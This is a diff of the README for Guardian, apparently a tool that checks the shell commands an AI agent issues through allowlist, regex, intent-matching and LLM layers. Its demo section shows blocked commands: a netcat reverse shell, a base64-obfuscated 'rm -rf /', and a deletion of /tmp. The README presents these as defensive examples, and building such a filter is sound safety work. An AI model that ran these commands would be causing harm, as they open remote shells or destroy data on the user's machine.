@@ -6,18 +6,43 @@
 ![Precision](https://img.shields.io/badge/precision-100%25-brightgreen)
 ![Recall](https://img.shields.io/badge/recall-100%25-brightgreen)
 
-> [!IMPORTANT]
-> **"Security first. Because you can't control the randomness of an LLM with another random LLM."**
+AI agents can run shell commands on your machine. Guardian decides which ones actually run.
 
----
+AI agent frameworks often provide LLMs with direct shell access to complete tasks. In most implementations, security relies entirely on the model's willingness to follow system instructions. But model compliance is not the same thing as security enforcement.
 
-## The Problem
+## See it in action
 
-I wanted to use an AI agent on my machine, but I didn't trust giving it shell access without control. Current frameworks lack native enforcement on tools and rely almost exclusively on model compliance or fragile prompt engineering. I built Guardian as a deterministic intermediate layer to take the final decision-making power away from the LLM when it comes to executing commands on the system.
+task:    "list files"
+command: "nc -e /bin/bash 10.0.0.1 4444"
+layer:   L1 — Binary Allowlist
+verdict: BLOCKED
+reason:  Binary 'nc' is in the red-zone/not permitted in this context.
+
+task:    "check disk"
+command: "$(echo cm0gLXJmIC8= | base64 -d)"
+layer:   L2 — Regex Engine
+verdict: BLOCKED
+reason:  Obfuscation pattern detected (base64 decoding in shell command).
+
+task:    "analyze disk usage"
+command: "rm -rf /tmp"
+layer:   L3 — Intent Coherence
+verdict: BLOCKED
+reason:  Task intent is 'read/analyze', command action is 'delete'. Conflict detected. ← This is L3: Intent Coherence. The differentiator.
+
+task:    "clean temp files"
+command: "find /tmp -mtime +7 -delete"
+layer:   L4 — LLM Semantic Check
+verdict: ALLOWED
+reason:  Ambiguous use of 'delete' is justified by the task intent 'clean temp files'.
+
+## Why this exists
+
+The AI ecosystem has an enforcement gap. While we have tools to monitor inputs and outputs, no major agent framework ships with native, pre-tool execution control. Prompt engineering is often used as a defense, but it is a suggestion, not a secure boundary. Guardian solves this by providing a deterministic intermediate layer that removes final decision-making power from the LLM for system-level actions.
 
 ## How it works
 
-The Guardian operates a 4-layer validation pipeline. It is "Fail-Closed" by design: if a layer has a doubt, the command is blocked.
+Guardian operates a 4-layer validation pipeline. It is "Fail-Closed" by design: if a layer has a doubt, the command is blocked.
 
 ```
  Agent Request
@@ -48,48 +73,19 @@ The Guardian operates a 4-layer validation pipeline. It is "Fail-Closed" by desi
 
 1.  **L1: Binary Allowlist**: Immediate filter based on risk zones (green, yellow, red). If a binary is not explicitly permitted in the current context, the execution dies here.
 2.  **L2: Regex Pattern Matching**: A dual-path ReDoS-safe engine that checks both the raw and normalized command against patterns of obfuscation, exfiltration, and destruction.
-3. **L3. **Intent Coherence Mapping**: This is the differentiator. It maps both the `task` field and the command to one of four intent families — `read`, `write`, `delete`, `network` — using a static keyword taxonomy, then checks for conflicts. The taxonomy is intentionally minimal to keep deterministic rules auditable and predictable.
+3.  **L3: Intent Coherence Mapping**: This is the differentiator. It maps both the `task` field and the command to one of four intent families — `read`, `write`, `delete`, `network` — using a static keyword taxonomy, then checks for conflicts. The taxonomy is intentionally minimal to keep deterministic rules auditable and predictable.
 
-   The mapping is deterministic: each family is defined by a fixed set of keywords and command verbs. A conflict is flagged when the task intent and the command intent belong to incompatible families.
+    | Task intent | Command intent | Result  |
+    |-------------|----------------|---------|
+    | read        | delete         | BLOCKED |
+    | read        | network        | BLOCKED |
+    | write       | delete         | BLOCKED |
+    | write       | read           | ALLOWED |
+    | delete      | delete         | ALLOWED |
 
-   | Task intent | Command intent | Result  |
-   |-------------|----------------|---------|
-   | read        | delete         | BLOCKED |
-   | read        | network        | BLOCKED |
-   | write       | delete         | BLOCKED |
-   | write       | read           | ALLOWED |
-   | delete      | delete         | ALLOWED |
-
-   Example: `task="analyze disk usage"` + `command="rm -rf /tmp"` → task maps to `read`, command maps to `delete` → **BLOCKED**.
+    Example: `task="analyze disk usage"` + `command="rm -rf /tmp"` → task maps to `read`, command maps to `delete` → **BLOCKED**.
 
 4.  **L4: LLM Semantic Check**: The LLM is the last resort. It is consulted only for ambiguous cases that deterministic layers cannot resolve, adding a final level of semantic understanding.
-
-## See it in action
-
-task:    "list files"
-command: "nc -e /bin/bash 10.0.0.1 4444"
-layer:   L1 — Binary Allowlist
-verdict: BLOCKED
-reason:  Binary 'nc' is in the red-zone/not permitted in this context.
-
-task:    "check disk"
-command: "$(echo cm0gLXJmIC8= | base64 -d)"
-layer:   L2 — Regex Engine
-verdict: BLOCKED
-reason:  Obfuscation pattern detected (base64 decoding in shell command).
-
-task:    "analyze disk usage"
-command: "rm -rf /tmp"
-layer:   L3 — Intent Coherence
-verdict: BLOCKED
-reason:  Task intent is 'read/analyze', command action is 'delete'. Conflict detected. ← This is L3: Intent Coherence. The differentiator.
-
-task:    "clean temp files"
-command: "find /tmp -mtime +7 -delete"
-layer:   L4 — LLM Semantic Check
-verdict: ALLOWED
-reason:  Ambiguous use of 'delete' is justified by the task intent 'clean temp files'.
-
 
 ## Why determinism first
 
